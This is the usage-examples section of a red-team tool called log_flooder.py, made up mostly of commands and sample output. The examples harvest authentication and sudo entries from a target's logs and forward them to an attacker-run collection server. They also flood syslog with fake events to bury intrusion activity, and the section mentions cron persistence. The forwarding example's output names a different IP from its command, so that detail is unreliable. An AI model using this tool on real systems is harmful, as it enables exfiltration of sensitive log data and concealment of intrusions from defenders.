### Basic usage examples

#### 1. Collect and print findings from default logs

```bash
python3 log_flooder.py --collect
```

```
[+] Running as unprivileged user
[+] Analysing logs (keywords: ['failed', 'sudo', 'root', 'error']) …
[+] 142 findings extracted
  [/var/log/auth.log] [keyword:failed, auth_failure_or_error] Failed password for invalid user admin from 192.168.1.105 port 54321
  [/var/log/auth.log] [keyword:sudo] sudo: alice : TTY=pts/1 ; USER=root ; COMMAND=/bin/bash
  …
```

#### 2. Collect, save locally, and forward to Red Team box

```bash
# On the target box:
python3 log_flooder.py --collect \
    --keywords failed sudo root ssh \
    --logs /var/log/auth.log /var/log/syslog \
    --save \
    --forward 10.0.0.32
```

```
[+] Running as unprivileged user
[+] Analysing logs (keywords: ['failed', 'sudo', 'root', 'ssh']) …
[+] 87 findings extracted
[+] Findings saved → rt_collected_logs/findings_20250215T143022Z.json
[+] Forwarded 87 entries to 10.0.0.50:5140  (failed: 0)
```

#### 3. Run the collection server on your RT box

```bash
# On your RT box (blocks until Ctrl-C):
python3 log_flooder.py --serve --bind 0.0.0.0 --port 5140 \
    --storage-dir /home/rtuser/collected
```

```
[+] Collection server listening on 0.0.0.0:5140
[+] Storing to /home/rtuser/collected
[+] Connection from 192.168.10.22:49812
[+] 192.168.10.22: received 87 entries
[+] Saved 87 entries → /home/rtuser/collected/findings_20250215T143023Z.json
```

#### 4. Generate log noise to bury your activity

```bash
# Requires root — floods syslog with 20 synthetic events/sec for 2 minutes:
sudo python3 log_flooder.py --flood --rate 20 --duration 120
```

```
[+] Running as root
[+] Flooding syslog at 20 msg/sec for 120s …
[+] Flood complete — 2400 entries written
```

#### 5. Print an aggregated summary of all collected findings

```bash
python3 log_flooder.py --summary --storage-dir /home/rtuser/collected
```

```
=== Findings Summary ===
  Total entries : 312
  Flag counts   : {'auth_failure_or_error': 198}

  Top IPs:
    192.168.1.105           87 hits
    10.10.0.2               34 hits
    …

  Top Users:
    admin                   42 hits
    root                    31 hits
    …
```

#### 6. Remove cron persistence

```bash
python3 log_flooder.py --unpersist /tmp/log_flooder.py
```
